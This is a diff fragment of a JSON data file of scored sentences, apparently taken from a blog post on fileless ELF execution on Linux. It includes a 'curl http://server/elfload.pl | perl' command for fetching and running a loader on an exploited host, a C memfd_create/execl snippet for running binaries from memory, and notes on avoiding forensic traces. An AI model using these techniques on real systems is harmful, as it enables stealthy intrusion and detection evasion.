+        "sentence": "When not given a script or a bit of code with -e , Perl expects a script on stdin, so we send the script to perl stdin via our local SSH client.",
+        "score": 0.3529
+      },
+      {
+        "sentence": "The end result is our script is run without touching disk at all.",
+        "score": 0.3671
+      },
+      {
+        "sentence": "Without creds but with access to the target (i.e. after exploiting on), in most cases we can probably use the devopsy curl http://server/elfload.pl | perl trick (or intercept someone doing the trick for us).",
+        "score": 0.3504
+      },
+      {
+        "sentence": "As long as the script makes it to Perl’s stdin and Perl gets an EOF when the script’s all read, it doesn’t particularly matter how it gets there.",
+        "score": 0.3967
+      },
+      {
+        "sentence": "Artifacts Once running, the only real difference between a program running from an anonymous file and a program running from a normal file is the /proc/<PID>/exe symlink.",
+        "score": 0.497
+      },
+      {
+        "sentence": "If something’s monitoring system calls (e.g. someone’s running strace -f on sshd), the memfd_create(2) calls will stick out, as will passing paths in /proc/<PID>/fd to execve(2) .",
+        "score": 0.3119
+      },
+      {
+        "sentence": "TL;DR In C (translate to your non-disk-touching language of choice): fd = memfd_create(\"\", MFD_CLOEXEC); write(fd, elfbuffer, elfbuffer_len); asprintf(p, \"/proc/self/fd/%i\", fd); execl(p, \"kittens\", \"arg1\", \"arg2\", NULL); Updated 20170402 to link to https://0x00sec.org/t/super-stealthy-droppers/3715, from where I got execve(\"/proc/<PID>/fd/<FD>...",
+        "score": 0.5326
+      }
+    ]
+  }
+}
